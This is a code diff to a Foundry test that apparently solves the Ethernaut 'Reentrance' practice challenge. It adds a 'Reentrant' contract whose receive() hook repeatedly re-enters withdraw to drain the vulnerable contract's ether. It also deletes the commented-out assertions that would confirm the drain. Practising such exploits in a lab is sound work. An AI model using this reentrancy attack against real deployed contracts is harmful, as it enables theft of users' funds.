@@ -40,13 +40,31 @@ contract TestReentrance is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
-
-        // check that the victim has no more ether
-        //assertEq(address(level).balance, 0);
-
-        // check that the player has all the ether present before in the victim contract
-        //assertEq(player.balance, playerBalance + levelBalance);
+        Reentrant reentrant = new Reentrant{value: address(level).balance/10}(levelAddress);
+        reentrant.attack();
 
         vm.stopPrank();
     }
+}
+
+contract Reentrant {
+    Reentrance private level;
+    uint256 public amount;
+
+    constructor(address _level) public payable {
+        level = Reentrance(payable(_level));
+        amount = msg.value;
+    }
+
+    function attack() public payable {
+        level.donate{value: amount}(address(this));
+        level.withdraw(amount);
+    }
+
+    receive() external payable {
+        if (address(level).balance > amount) {
+            level.withdraw(amount);
+        }
+        level.withdraw(address(level).balance);
+    }  
 }
